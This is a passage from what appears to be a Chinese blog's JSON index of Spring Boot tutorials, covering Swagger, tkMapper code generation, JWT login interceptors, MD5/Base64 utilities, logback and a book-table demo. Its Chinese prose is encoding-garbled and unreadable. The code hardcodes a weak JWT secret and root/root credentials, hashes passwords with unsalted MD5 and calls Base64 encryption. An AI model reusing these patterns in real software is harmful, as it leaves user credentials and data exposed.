.description(&quot;æ­¤æ–‡æ¡£è¯¦ç»†è¯´æ˜äº†é”‹è¿·å•†åŸé¡¹ç›®åç«¯æ¥å£è§„èŒƒ....&quot;) .version(&quot;v 2.0.1&quot;) .contact( new Contact(&quot;sunzy&quot;,&quot;www.suzny.com&quot;,&quot;sunzy@wang.com&quot;) ); ApiInfo apiInfo = apiInfoBuilder.build(); Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo) //æŒ‡å®šç”Ÿæˆçš„æ–‡æ¡£ä¸­çš„å°é¢ä¿¡æ¯ï¼šæ–‡æ¡£æ ‡é¢˜ã€ç‰ˆæœ¬ã€ä½œè€… .select() .apis(RequestHandlerSelectors.basePackage(&quot;com.sunzy.fmmall.controller&quot;)) .paths(PathSelectors.any()) .build(); return docket; &#125; &#125; å¯åŠ¨springbooté¡¹ç›®è®¿é—®é¡¹ç›®åœ°å€/swagger-ui.htmlå³å¯çœ‹åˆ°ç›¸å…³æ¥å£ä¿¡æ¯ï¼Œå¹¶å¯ä»¥è¿›è¡Œæµ‹è¯• 3.swaggeræ³¨è§£è¯´æ˜ Swaggeræä¾›ä¸€å¥—è¯¦ç»†çš„æ³¨è§£å¯ä»¥å¯¹æ¥å£è¿›è¡Œè¯¦ç»†çš„è¯´æ˜ @Api ç±»æ³¨è§£ï¼Œå¯¹æ§åˆ¶å™¨ç±»æ·»åŠ æ­¤æ³¨è§£å¯ä»¥å¯¹æ§åˆ¶å™¨è¿›è¡ŒåŠŸèƒ½è¯´æ˜ @Api(value = &quot;ç”¨æˆ·ç®¡ç†&quot;, tags = &quot;æä¾›ç”¨æˆ·æ³¨å†Œå’Œç™»å½•æœåŠ¡&quot;) @ApiOperation æ–¹æ³•æ³¨è§£ï¼Œå¯¹æ¯ä¸ªæ–¹æ³•ä½œç”¨è¿›è¡Œè¯¦ç»†è¯´æ˜ @ApiOperation(&quot;ç”¨æˆ·ç™»å½•æ¥å£&quot;) @ApiImplicitParamså’Œ@ApiImplicitParam å¯¹æ–¹æ³•ä¸­çš„å‚æ•°è¿›è¡Œè¯¦ç»†çš„è¯´æ˜ï¼ŒåŒ…æ‹¬å­—æ®µåï¼Œå¤‡æ³¨ï¼Œæ˜¯å¦å¿…é¡»ï¼Œä»¥åŠé»˜è®¤å€¼ @ApiImplicitParams( @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;ç”¨æˆ·è´¦å·&quot;, required = true), @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;ç”¨æˆ·å¯†ç &quot;, required = true) ) @ApiModel å½“æ¥å£å‚æ•°å’Œè¿”å›å€¼ç±»å‹ä¸ºå¯¹è±¡ç±»å‹æ˜¯éœ€è¦æ·»åŠ æ­¤æ³¨è§£ @ApiModel(value = &quot;ResultVOå¯¹è±¡&quot;,description = &quot;å°è£…æ¥å£è¿”å›ç»™å‰ç«¯çš„æ•°æ®&quot;) @ApiModelProperty æ¨¡å‹ä¸­çš„æˆå‘˜å˜é‡è¿›è¡Œè¯´æ˜ @ApiModelProperty(value = &quot;å“åº”çŠ¶æ€ç &quot;,dataType = &quot;int&quot;) private int code; @ApiIngnoreæ¥å£æ–¹æ³•æ³¨è§£ï¼Œæ·»åŠ æ­¤æ³¨è§£çš„æ–¹æ³•ä¸ä¼šå‡ºç°åœ¨æ¥å£æ–‡æ¡£ä¸­ 4.swagger-uiæ’ä»¶å¯¼å…¥æ’ä»¶ä¾èµ– &lt;!--swagger-uiæ’ä»¶ä¾èµ–--&gt; &lt;dependency&gt; &lt;groupId&gt;com.github.xiaoymin&lt;/groupId&gt; &lt;artifactId&gt;swagger-bootstrap-ui&lt;/artifactId&gt; &lt;version&gt;1.9.6&lt;/version&gt; &lt;/dependency&gt; è®¿é—®url:http://localhost:8080/doc.html ,uiç•Œé¢è®¾è®¡æ›´åŠ ç¾è§‚ tkMapperæ•´åˆtkmapper 1.å¯¼å…¥ä¾èµ–&lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.1.5&lt;/version&gt; &lt;/dependency&gt; 2.é…ç½®application.ymlæ–‡ä»¶spring: datasource: druid: driver-class-name: com.mysql.cj.jdbc.Driver username: root password: root url: jdbc:mysql://localhost:3306/fmmall?characterEncoding=utf-8&amp;useSSL=false mybatis: mapper-locations: classpath:mapper/*Mapper.xml type-aliases-package: com.sunzy.fmmall.dao 3.ä¿®æ”¹å¯åŠ¨ç±»æ³¨æ„MapperScanéœ€è¦ä½¿ç”¨tkmapperåŒ…ä¸­çš„ package com.sunzy.tkmapper; //import org.mybatis.spring.annotation.MapperScan; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import tk.mybatis.spring.annotation.MapperScan; @SpringBootApplication //@MapperScan(&quot;com.sunzy.tkmapper.dao&quot;) @MapperScan(&quot;com.sunzy.tkmapper.dao&quot;) public class TkmapperDemoApplication &#123; public static void main(String[] args) &#123; SpringApplication.run(TkmapperDemoApplication.class, args); &#125; &#125; 4.é€†å‘å·¥ç¨‹å¯¼å…¥æ’ä»¶ä¾èµ– &lt;plugin&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-maven-plugin&lt;/artifactId&gt; &lt;version&gt;1.3.5&lt;/version&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.47&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper&lt;/artifactId&gt; &lt;version&gt;3.4.4&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;/plugin&gt; æ·»åŠ é…ç½®æ–‡ä»¶GeneratorConfig.xml è®°å¾—ä¿®æ”¹å¯¹åº”åŒ…å&lt;!--**--&gt;æ ‡è®°å¤„éœ€è¦ä¿®æ”¹ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE generatorConfiguration PUBLIC &quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;&gt; &lt;generatorConfiguration&gt; &lt;!-- å¼•â¼Šæ•°æ®åº“è¿æ¥é…ç½® --&gt; &lt;!-- &lt;properties resource=&quot;jdbc.properties&quot;/&gt;--&gt; &lt;context id=&quot;Mysql&quot; targetRuntime=&quot;MyBatis3Simple&quot; defaultModelType=&quot;flat&quot;&gt; &lt;property name=&quot;beginningDelimiter&quot; value=&quot;`&quot;/&gt; &lt;property name=&quot;endingDelimiter&quot; value=&quot;`&quot;/&gt; &lt;!-- é…ç½® GeneralDAO --&gt; &lt;plugin type=&quot;tk.mybatis.mapper.generator.MapperPlugin&quot;&gt; &lt;property name=&quot;mappers&quot; value=&quot;com.sunzy.fmmall.general.GeneralDao&quot;/&gt;&lt;!--**--&gt; &lt;/plugin&gt; &lt;!-- é…ç½®æ•°æ®åº“è¿æ¥ --&gt; &lt;jdbcConnection driverClass=&quot;com.mysql.jdbc.Driver&quot; connectionURL=&quot;jdbc:mysql://localhost:3306/fmmall?useSSL=false&quot; userId=&quot;root&quot; password=&quot;root&quot;&gt;&lt;!--**--&gt; &lt;/jdbcConnection&gt; &lt;!-- é…ç½®å®ä½“ç±»å­˜æ”¾è·¯å¾„ --&gt; &lt;javaModelGenerator targetPackage=&quot;com.sunzy.fmmall.entity&quot; targetProject=&quot;src/main/java&quot;/&gt; &lt;!--**--&gt; &lt;!-- é…ç½® XML å­˜æ”¾è·¯å¾„ --&gt; &lt;sqlMapGenerator targetPackage=&quot;/&quot; targetProject=&quot;src/main/resources/mapper&quot;/&gt; &lt;!--**--&gt; &lt;!-- é…ç½® DAO å­˜æ”¾è·¯å¾„ --&gt; &lt;javaClientGenerator targetPackage=&quot;com.sunzy.fmmall.dao&quot; targetProject=&quot;src/main/java&quot; type=&quot;XMLMAPPER&quot;/&gt; &lt;!--**--&gt; &lt;!-- é…ç½®éœ€è¦æŒ‡å®šâ½£æˆçš„æ•°æ®åº“å’Œè¡¨ï¼Œ% ä»£è¡¨æ‰€æœ‰è¡¨ --&gt; &lt;table tableName=&quot;%&quot;&gt; &lt;!-- mysql é…ç½® --&gt; &lt;!-- &lt;generatedKey column=&quot;id&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;/table&gt; &lt;!-- &lt;table tableName=&quot;tb_roles&quot;&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql é…ç½® &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=&quot;roleid&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;!-- &lt;table tableName=&quot;tb_permissions&quot;&gt;--&gt; &lt;!-- &amp;lt;!&amp;ndash; mysql é…ç½® &amp;ndash;&amp;gt;--&gt; &lt;!-- &lt;generatedKey column=&quot;perid&quot; sqlStatement=&quot;Mysql&quot; identity=&quot;true&quot;/&gt;--&gt; &lt;!-- &lt;/table&gt;--&gt; &lt;/context&gt; &lt;/generatorConfiguration&gt; åˆ›å»ºcom.sunzy.fmmall.general.GeneralDao package com.sunzy.fmmall.general; import tk.mybatis.mapper.common.Mapper; import tk.mybatis.mapper.common.MySqlMapper; public interface GeneralDao&lt;T&gt; extends Mapper&lt;T&gt;, MySqlMapper&lt;T&gt; &#123; &#125; åœ¨pom.xmlä¸­æ·»åŠ é…ç½®æ–‡ä»¶çš„ä½ç½® ä½¿ç”¨æ’ä»¶è¿›è¡Œä»£ç ç”Ÿæˆ JWTå®ç°ç™»å½•æƒé™è®¤è¯1.å¯¼å…¥JWTä¾èµ–&lt;dependency&gt; &lt;groupId&gt;com.auth0&lt;/groupId&gt; &lt;artifactId&gt;java-jwt&lt;/artifactId&gt; &lt;version&gt;3.10.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.jsonwebtoken&lt;/groupId&gt; &lt;artifactId&gt;jjwt&lt;/artifactId&gt; &lt;version&gt;0.9.1&lt;/version&gt; &lt;/dependency&gt; 2.ç”Ÿæˆå¯¹åº”çš„tokenå¹¶è¿”å›ç»™å‰ç«¯// éªŒè¯æˆåŠŸåˆ™ç”Ÿæˆå¯¹åº”çš„token // ä½¿ç”¨jwtç”Ÿæˆtoken JwtBuilder builder = Jwts.builder(); Map&lt;String, Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;key1&quot;, &quot;value2&quot;); map.put(&quot;key2&quot;, &quot;value2&quot;); JwtBuilder jwtBuilder = builder.setSubject(username) //è®¾ç½®subject .setIssuedAt(new Date()) // è®¾ç½®tokenç”Ÿæˆçš„æ—¶é—´ .setId(user.getUserId() + &quot;&quot;) // è®¾ç½®useridä¸ºtokençš„å”¯ä¸€id .setClaims(map) // mapä¸­å¯ä»¥å­˜æ”¾ç”¨æˆ·çš„è§’è‰²å’Œæƒé™ä¿¡æ¯ .setExpiration(new Date(System.currentTimeMillis() + 24 * 60 * 60 * 1000 * 2)) // è®¾ç½®tokençš„è¿‡æœŸæ—¶é—´ ä¸ºä¸¤å¤© .signWith(SignatureAlgorithm.HS256, &quot;sunzy123456&quot;);// è®¾ç½®tokençš„åŠ å¯†æ–¹å¼å’ŒåŠ å¯†å¯†é’¥ String token = jwtBuilder.compact(); // è·å–token return new ResultVO(ResStatus.OK, token, user); 3.å‰ç«¯è¿›è¡Œç™»å½•éªŒè¯æ—¶è·å–å¯¹åº”çš„token 4.JWTè¿›è¡Œtokenè§£æif(token == null || &quot;&quot;.equals(token))&#123; return new ResultVO(ResStatus.NO, &quot;failed&quot;, null); &#125;else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´ try&#123; // å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸ Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ® String subject = body.getSubject(); // è·å–tokenä¸­å‘subject String key1 = body.get(&quot;key1&quot;, String.class); /// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼ &#125;catch(UnsupportedJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;tokenä¸åˆæ³•è¯·é‡æ–°ç™»å½•ï¼&quot;, null); &#125;catch(ExpiredJwtException e)&#123; return new ResultVO(ResStatus.NO, &quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;, null); &#125; catch (Exception e)&#123; return new ResultVO(ResStatus.NO, &quot;æœªçŸ¥é”™è¯¯&quot;, null); &#125; 5.ä½¿ç”¨æ‹¦æˆªå™¨éªŒè¯token åˆ›å»ºæ‹¦æˆªå™¨ package com.sunzy.fmmall.interceptor; import com.alibaba.fastjson.JSON; import com.sunzy.fmmall.vo.ResStatus; import com.sunzy.fmmall.vo.ResultVO; import io.jsonwebtoken.*; import org.springframework.context.annotation.Configuration; import org.springframework.stereotype.Component; import org.springframework.web.servlet.HandlerInterceptor; import org.springframework.web.servlet.ModelAndView; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; @Component public class CheckTokenInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; String token = request.getParameter(&quot;token&quot;); if (token == null || &quot;&quot;.equals(token)) &#123; doResponse(response, &quot;è¯·å…ˆç™»å½•ï¼&quot;); return false; &#125; else &#123; JwtParser parser = Jwts.parser(); parser.setSigningKey(&quot;sunzy123456&quot;); // å¯†é’¥éœ€è¦ä¸åŠ å¯†æ—¶ä½¿ç”¨çš„ä¸€è‡´ try &#123; // å¦‚æœtokenæ­£ç¡® ä¸”åœ¨æœ‰æ•ˆæœŸå†… åˆ™è§£ææ­£å¸¸å¦åˆ™ä¼šå‡ºç°å¼‚å¸¸ Jws&lt;Claims&gt; claimsJws = parser.parseClaimsJws(token); Claims body = claimsJws.getBody(); // è·å–tokenä¸­çš„ç”¨æˆ·æ•°æ® String subject = body.getSubject(); // è·å–tokenä¸­å‘subject String key1 = body.get(&quot;key1&quot;, String.class); /// è·å–æ·»åŠ åœ¨mapä¸­çš„å€¼ return true; &#125; catch (UnsupportedJwtException e) &#123; doResponse(response,&quot;tokenä¸åˆæ³•ï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;); &#125; catch (ExpiredJwtException e) &#123; doResponse(response,&quot;tokenå·²è¿‡æœŸï¼Œè¯·é‡æ–°ç™»å½•ï¼&quot;); &#125; catch (Exception e) &#123; doResponse(response,&quot;æœªçŸ¥é”™è¯¯ï¼&quot;); &#125; return false; &#125; &#125; private void doResponse(HttpServletResponse response, String msg) throws IOException &#123; ResultVO resultVO = new ResultVO(ResStatus.NO, msg, null); String string = JSON.toJSONString(resultVO); response.setContentType(&quot;application/json&quot;); response.setCharacterEncoding(&quot;utf-8&quot;); PrintWriter writer = response.getWriter(); writer.write(string); writer.flush(); writer.close(); &#125; &#125; é…ç½®æ‹¦æˆªå™¨ package com.sunzy.fmmall.config; import com.sunzy.fmmall.interceptor.CheckTokenInterceptor; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.InterceptorRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * æ‹¦æˆªå™¨çš„é…ç½®ç±» */ @Configuration public class InterceptorConfig implements WebMvcConfigurer &#123; @Autowired private CheckTokenInterceptor checkTokenInterceptor; @Override public void addInterceptors(InterceptorRegistry registry) &#123; // registryæ˜¯æ‹¦æˆªå™¨çš„æ³¨å†Œå™¨ // å°†è‡ªå·±åˆ›å»ºçš„æ‹¦æˆªå™¨åŠ å…¥è¿›æ¥ å³å¯å®ç°æ‹¦æˆªåŠŸèƒ½ registry.addInterceptor(checkTokenInterceptor) .addPathPatterns(&quot;/**&quot;) // æ‹¦æˆªæ‰€æœ‰è·¯å¾„ .excludePathPatterns(&quot;/user/**&quot;); // é™¤äº†ç”¨æˆ·ç™»å½•å’Œæ³¨å†Œè·¯å¾„ &#125; &#125; åŠ å¯†ä½¿ç”¨åˆ°å·¥å…·ç±»1.md5package com.qfedu.fmmall.utils; import java.math.BigInteger; import java.security.MessageDigest; import java.security.NoSuchAlgorithmException; //MD5 ç”Ÿæˆå™¨ public class MD5Utils &#123; public static String md5(String password)&#123; //ç”Ÿæˆä¸€ä¸ªmd5åŠ å¯†å™¨ try &#123; MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;); //è®¡ç®—MD5 çš„å€¼ md.update(password.getBytes()); //BigInteger å°†8ä½çš„å­—ç¬¦ä¸² è½¬æˆ16ä½çš„å­—ç¬¦ä¸² å¾—åˆ°çš„å­—ç¬¦ä¸²å½¢å¼æ˜¯å“ˆå¸Œç å€¼ //BigInteger(å‚æ•°1,å‚æ•°2) å‚æ•°1 æ˜¯ 1ä¸ºæ­£æ•° 0ä¸º0 -1ä¸ºè´Ÿæ•° return new BigInteger(1, md.digest()).toString(16); &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; return null; &#125; &#125; 2.base64package com.qfedu.fmmall.utils; import java.util.Base64; //base64 åŠ å¯† è§£å¯† æ¿€æ´»é‚®ä»¶çš„æ—¶å€™ ä¸º é‚®ç®±åœ°å€ codeéªŒè¯ç  è¿›è¡ŒåŠ å¯† //å½“ å›ä¼ å›æ¥å è¿›è¡Œé‚®ç®±åœ°å€ å’Œ code çš„è§£å¯† public class Base64Utils &#123; //åŠ å¯† public static String encode(String msg)&#123; return Base64.getEncoder().encodeToString(msg.getBytes()); &#125; //è§£å¯† public static String decode(String msg)&#123; return new String(Base64.getDecoder().decode(msg)); &#125; &#125; â€‹ logbackæ—¥å¿—æ·»åŠ xmlæ–‡ä»¶åœ¨springbooté¡¹ç›®çš„resourceç›®å½•ä¸‹åˆ›å»ºlogback-spring.xmlæ–‡ä»¶ &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;configuration&gt; &lt;appender name=&quot;stdout&quot; class=&quot;ch.qos.logback.core.ConsoleAppender&quot;&gt; &lt;encoder&gt; &lt;springProfile name=&quot;dev&quot;&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;springProfile name=&quot;!dev&quot;&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n&lt;/pattern&gt; &lt;/springProfile&gt; &lt;!--æ—¥å¿—çš„ç¼–ç æ ¼å¼--&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;appender name=&quot;timeFile&quot; class=&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;&gt; &lt;!--TimeBasedRollingPolicy åŸºäºæ—¶é—´çš„æ»šåŠ¨ç­–ç•¥--&gt; &lt;rollingPolicy class=&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;&gt; &lt;fileNamePattern&gt;log/log-%d&#123;yyyy-MM-dd-HH&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd-HH:mm:ss.SSS&#125; %level [%thread]-%class:%line&gt;&gt;%msg%n&lt;/pattern&gt; &lt;charset&gt;UTF-8&lt;/charset&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;root level=&quot;info&quot;&gt; &lt;appender-ref ref=&quot;stdout&quot;/&gt; &lt;appender-ref ref=&quot;timeFile&quot;/&gt; &lt;/root&gt; &lt;/configuration&gt; åœ¨sercieå®ç°ç±»åˆ›å»ºLoggerå¯¹è±¡ï¼Œè¾“â¼Šâ½‡å¿— æ—¥å¿—ä¼šè¢«è®°å½•åˆ°é¡¹ç›®çš„/logç›®å½•ä¸‹ï¼Œä¸”æ˜¯æŒ‰æ¯æ—¥è®°å½• log/log-%d&#123;yyyy-MM-dd-HH&#125;.log","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"springboot_demo","date":"2022-04-17T13:32:46.000Z","path":"2022/04/17/springboot-demo/","text":"springboot demoä½¿ç”¨springbootæ•´åˆSSMP 1.é¡¹ç›®éœ€æ±‚é¡¹ç›®æœ€ç»ˆå®ç°çš„é¡µé¢ â€‹ æ•´ä½“æ¡ˆä¾‹ä¸­éœ€è¦é‡‡ç”¨çš„æŠ€æœ¯å¦‚ä¸‹ï¼š Daoå¼€å‘â€”â€”â€”â€”æ•´åˆMyBatisPlusï¼Œåˆ¶ä½œæ•°æ®å±‚æµ‹è¯• Serviceå¼€å‘â€”â€”â€”â€”åŸºäºMyBatisPlusè¿›è¡Œå¢é‡å¼€å‘ï¼Œåˆ¶ä½œä¸šåŠ¡å±‚æµ‹è¯•ç±» Controllerå¼€å‘â€”â€”â€”â€”åŸºäºRestfulå¼€å‘ï¼Œä½¿ç”¨PostManæµ‹è¯•æ¥å£åŠŸèƒ½ Controllerå¼€å‘â€”â€”â€”â€”å‰åç«¯å¼€å‘åè®®åˆ¶ä½œ é¡µé¢å¼€å‘â€”â€”â€”â€”åŸºäºVUE+ElementUIåˆ¶ä½œï¼Œå‰åç«¯è”è°ƒï¼Œé¡µé¢æ•°æ®å¤„ç†ï¼Œé¡µé¢æ¶ˆæ¯å¤„ç† åˆ—è¡¨ æ–°å¢ ä¿®æ”¹ åˆ é™¤ åˆ†é¡µ æŸ¥è¯¢ é¡¹ç›®å¼‚å¸¸å¤„ç† æŒ‰æ¡ä»¶æŸ¥è¯¢â€”â€”â€”â€”é¡µé¢åŠŸèƒ½è°ƒæ•´ã€Controllerä¿®æ­£åŠŸèƒ½ã€Serviceä¿®æ­£åŠŸèƒ½ 2.åˆ›å»ºspringbootçš„webé¡¹ç›®æ–°å»ºæ¨¡å—File-&gt;new-&gt;module è¿™é‡Œæ²¡ä»€ä¹ˆéœ€è¦æ”¹çš„ï¼Œåªéœ€è¦ä¿®æ”¹ä½¿ç”¨çš„javaç‰ˆæœ¬ é€‰æ‹©æ‰€éœ€è¦çš„ä¾èµ–ï¼Œé€‰æ‹©åspringbootå°±å¯ä»¥è‡ªåŠ¨å¯¼å…¥ç›¸å…³åæ ‡ï¼Œæ— éœ€æ‰‹åŠ¨å¯¼å…¥ ==æ³¨æ„å°†é…ç½®æ–‡ä»¶æ”¹ä¸ºymlç±»å‹== application.yml # ä¿®æ”¹é…ç½®å°†tomcatçš„ç«¯å£æ”¹ä¸º80 server: port: 80 3.å¼€å‘æµç¨‹å®ä½“ç±»å¼€å‘æ•°æ®åº“èµ„æº -- ---------------------------- -- Table structure for tbl_book -- ---------------------------- DROP TABLE IF EXISTS `tbl_book`; CREATE TABLE `tbl_book` ( `id` int(11) NOT NULL AUTO_INCREMENT, `type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL, PRIMARY KEY (`id`) USING BTREE ) ENGINE = InnoDB AUTO_INCREMENT = 51 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic; -- ---------------------------- -- Records of tbl_book -- ---------------------------- INSERT INTO `tbl_book` VALUES (1, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;Springå®æˆ˜ ç¬¬5ç‰ˆ&#x27;, &#x27;Springå…¥é—¨ç»å…¸æ•™ç¨‹ï¼Œæ·±å…¥ç†è§£SpringåŸç†æŠ€æœ¯å†…å¹•&#x27;); INSERT INTO `tbl_book` VALUES (2, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;Spring 5æ ¸å¿ƒåŸç†ä¸30ä¸ªç±»æ‰‹å†™å®æˆ˜&#x27;, &#x27;åå¹´æ²‰æ·€ä¹‹ä½œï¼Œæ‰‹å†™Springç²¾åæ€æƒ³&#x27;); INSERT INTO `tbl_book` VALUES (3, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;Spring 5 è®¾è®¡æ¨¡å¼&#x27;, &#x27;æ·±å…¥Springæºç å‰–æSpringæºç ä¸­è•´å«çš„10å¤§è®¾è®¡æ¨¡å¼&#x27;); INSERT INTO `tbl_book` VALUES (4, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;Spring MVC+MyBatiså¼€å‘ä»å…¥é—¨åˆ°é¡¹ç›®å®æˆ˜&#x27;, &#x27;å…¨æ–¹ä½è§£æé¢å‘Webåº”ç”¨çš„è½»é‡çº§æ¡†æ¶ï¼Œå¸¦ä½ æˆä¸ºSpring MVCå¼€å‘é«˜æ‰‹&#x27;); INSERT INTO `tbl_book` VALUES (5, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;è½»é‡çº§Java Webä¼ä¸šåº”ç”¨å®æˆ˜&#x27;, &#x27;æºç çº§å‰–æSpringæ¡†æ¶ï¼Œé€‚åˆå·²æŒæ¡JavaåŸºç¡€çš„è¯»è€…&#x27;); INSERT INTO `tbl_book` VALUES (6, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;Javaæ ¸å¿ƒæŠ€æœ¯ å·I åŸºç¡€çŸ¥è¯†ï¼ˆåŸä¹¦ç¬¬11ç‰ˆï¼‰&#x27;, &#x27;Core Java ç¬¬11ç‰ˆï¼ŒJoltå¤§å¥–è·å¥–ä½œå“ï¼Œé’ˆå¯¹Java SE9ã€10ã€11å…¨é¢æ›´æ–°&#x27;); INSERT INTO `tbl_book` VALUES (7, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;æ·±å…¥ç†è§£Javaè™šæ‹Ÿæœº&#x27;, &#x27;5ä¸ªç»´åº¦å…¨é¢å‰–æJVMï¼Œå¤§å‚é¢è¯•çŸ¥è¯†ç‚¹å…¨è¦†ç›–&#x27;); INSERT INTO `tbl_book` VALUES (8, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;Javaç¼–ç¨‹æ€æƒ³ï¼ˆç¬¬4ç‰ˆï¼‰&#x27;, &#x27;Javaå­¦ä¹ å¿…è¯»ç»å…¸,æ®¿å ‚çº§è‘—ä½œï¼èµ¢å¾—äº†å…¨çƒç¨‹åºå‘˜çš„å¹¿æ³›èµèª‰&#x27;); INSERT INTO `tbl_book` VALUES (9, &#x27;è®¡ç®—æœºç†è®º&#x27;, &#x27;é›¶åŸºç¡€å­¦Javaï¼ˆå…¨å½©ç‰ˆï¼‰&#x27;, &#x27;é›¶åŸºç¡€è‡ªå­¦ç¼–ç¨‹çš„å…¥é—¨å›¾ä¹¦ï¼Œç”±æµ…å…¥æ·±ï¼Œè¯¦è§£Javaè¯­è¨€çš„ç¼–ç¨‹æ€æƒ³å’Œæ ¸å¿ƒæŠ€æœ¯&#x27;); INSERT INTO `tbl_book` VALUES (10, &#x27;å¸‚åœºè¥é”€&#x27;, &#x27;ç›´æ’­å°±è¯¥è¿™ä¹ˆåšï¼šä¸»æ’­é«˜æ•ˆæ²Ÿé€šå®æˆ˜æŒ‡å—&#x27;, &#x27;æå­æŸ’ã€æä½³ç¦ã€è–‡å¨…æˆé•¿ä¸ºç½‘çº¢çš„ç§˜å¯†éƒ½åœ¨ä¹¦ä¸­&#x27;); INSERT INTO `tbl_book` VALUES (11, &#x27;å¸‚åœºè¥é”€&#x27;, &#x27;ç›´æ’­é”€è®²å®æˆ˜ä¸€æœ¬é€š&#x27;, &#x27;å’Œç§‹å¶ä¸€èµ·å­¦ç³»åˆ—ç½‘ç»œè¥é”€ä¹¦ç±&#x27;); INSERT INTO `tbl_book` VALUES (12, &#x27;å¸‚åœºè¥é”€&#x27;, &#x27;ç›´æ’­å¸¦è´§ï¼šæ·˜å®ã€å¤©çŒ«ç›´æ’­ä»æ–°æ‰‹åˆ°é«˜æ‰‹&#x27;, &#x27;ä¸€æœ¬æ•™ä½ å¦‚ä½•ç©è½¬ç›´æ’­çš„ä¹¦ï¼Œ10å ‚è¯¾è½»æ¾å®ç°å¸¦è´§æœˆå…¥3W+&#x27;); tbl_bookå¯¹åº”çš„å®ä½“ç±»å¦‚ä¸‹ import lombok.Data; @Data // Dataæ³¨è§£å¯ä»¥å¯ä»¥å®Œæˆæ‰€æœ‰å±æ€§çš„setter getter toStringï¼Œequalsï¼ŒhashCodeæ–¹æ³• public class Book &#123; private Integer id; private String type; private String name; private String description; &#125; ä¸ºäº†æ–¹ä¾¿å¼€å‘ä½¿ç”¨lombokæ³¨è§£ï¼Œåœ¨pom.xmlæ·»åŠ åæ ‡ &lt;dependencies&gt; &lt;!--lombok--&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; æ•°æ®å±‚å¼€å‘-CRUD(1) 